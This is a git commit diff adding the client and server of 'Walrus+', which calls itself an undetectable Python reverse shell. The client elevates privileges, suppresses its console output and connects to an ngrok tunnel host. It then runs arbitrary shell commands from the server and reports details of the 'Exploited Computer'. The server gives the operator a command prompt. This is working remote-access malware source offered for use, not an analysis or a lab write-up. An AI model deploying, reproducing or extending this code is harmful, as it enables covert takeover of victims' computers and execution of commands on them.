11a4a6aae99adbd19044f5a6d4b48367fed82d78
brody critchlow <brody@tntsplash.net>
2022-12-07 22:02:30 -0700

    Added Elevation, and ngrok support

---
+++ client.pyw
@@ -0,0 +1,52 @@
+"""
+Compiled to an exe if you are on windows, if you are linux you can set it up with python3 client.py.
+This is the client side of the program, it will connect to the server and send the data to it.
+The server can use the client to execute commands, tranfser files, and more.
+"""
+
+import socket
+import subprocess
+import time
+import sys
+import os
+import psutil
+from tabulate import tabulate
+from elevate import elevate
+
+# EDIT HOST, PORT TO YOUR SERVER SETTINGS
+
+HOST = "4.tcp.ngrok.io"
+PORT = 17806
+
+# DONT EDIT BELOW
+
+elevate(show_console=False, graphical=False)
+sys.stdout = open(os.devnull, "w")
+
+while True:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    con = sock.connect((HOST, PORT))
+    cmd = sock.recv(1024).decode().lower()
+
+    output, err = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+
+    valid_cmds = {'cmds': lambda: "\n"+tabulate([['get_ip', 'Grabs the exploited IP'], ['get_time', 'Grabs the Local Time for Exploited Computer'], ['get_date', 'Grabs the Local Date for Exploited Computer'], ['get_os', 'Grabs OS Name of Exploited Computer'], ['get_charging', 'Gets Charging status of Exploited Computer'], ['get_battery', 'Gets Battery % of Exploited Computer']], headers=['Name', 'Short Desc']),'get_ip': lambda: socket.gethostbyname(socket.gethostname()), 'get_time': lambda: time.strftime("%H:%M:%S", time.localtime()), 'get_date': lambda: time.strftime("%m/%d/%Y", time.localtime()), 'get_os': lambda: sys.platform, 'get_charging': lambda: str(psutil.sensors_battery().power_plugged), 'get_battery': lambda: str(psutil.sensors_battery().percent)}
+
+    if cmd[:2] == 'cd':
+        os.chdir(str(cmd[3:]))
+        output = f'Path Changed to {str(cmd[3:])}'.encode()
+    
+    if cmd == "exit":
+        sock.send("Exited".encode())
+        sock.close()
+        break
+
+    if 'is not recognized' in str(err) and cmd not in valid_cmds:
+        output = "Command not found".encode()
+    if cmd in valid_cmds:
+        output = valid_cmds[cmd]().encode()
+    
+
+    sock.send(output)
+    sock.close()
+    
---
+++ server.py
@@ -0,0 +1,57 @@
+"""
+This is a simple server that will listen on port and print the output of commands ran on client
+**THIS IS NOT SUPPOSED TO BE EDITED UNDER ANY CIRCUMSTANCES**
+"""
+
+__version__ = "1.0.0"
+
+import socket
+import argparse
+import pyfiglet
+import sys
+import os
+
+class Colors():
+    RED = "\033[1;31m"
+    GREEN = "\033[1;32m"
+    YELLOW = "\033[1;33m"
+    BLUE = "\033[1;34m"
+    MAGENTA = "\033[1;35m"
+    CYAN = "\033[1;36m"
+    WHITE = "\033[1;37m"
+    DARKGRAY = "\033[1;30m"
+    RESET = "\033[0;0m"
+    BOLD = "\033[;1m"
+    PURPLE = "\033[0;35m"
+
+clr = Colors()
+
+parser = argparse.ArgumentParser(description="This is a simple server that will listen on port and print the output of commands ran on client")
+parser.add_argument("-p", "--port", type=int, help="The port to listen on", required=False, default=25565)
+parser.add_argument("-i", "--ip", type=str, help="The ip to listen on", required=False, default="localhost")
+parser.add_argument("-m", "--max-connections", type=int, help="The max amount of connections to accept", required=False, default=1)
+args = parser.parse_args()
+
+os.system("clear" if os.name == "posix" else "cls")
+
+print(pyfiglet.figlet_format("Walrus+"))
+print(f"{clr.CYAN}The only {clr.BOLD}undetectable{clr.RESET}{clr.CYAN} Python Based reverse shell{clr.RESET}")
+print(f"  {clr.CYAN} PORT:{clr.RESET} {clr.YELLOW}{args.port}{clr.RESET}\n  {clr.CYAN} IP:{clr.RESET} {clr.YELLOW}{args.ip}{clr.RESET}\n  {clr.CYAN} MAX CONNECTIONS:{clr.RESET} {clr.YELLOW}{args.max_connections}{clr.RESET}")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((args.ip, args.port))
+
+while True:
+    try:
+        server.listen(args.max_connections)
+        A, C = server.accept()
+        
+        if (A):
+            command = input(f'{clr.CYAN}[WALRUS@{__version__}]{clr.RESET} {clr.YELLOW}>>>{clr.RESET} ')
+            
+            A.send(command.encode()) 
+            output = A.recv(1024).decode()
+            
+            print(f"{clr.YELLOW}[+] OUTPUT:{clr.RESET} {output}")
+    except Exception as e:
+        print(f'{clr.RED}[-] {e}{clr.RESET}')
+        pass
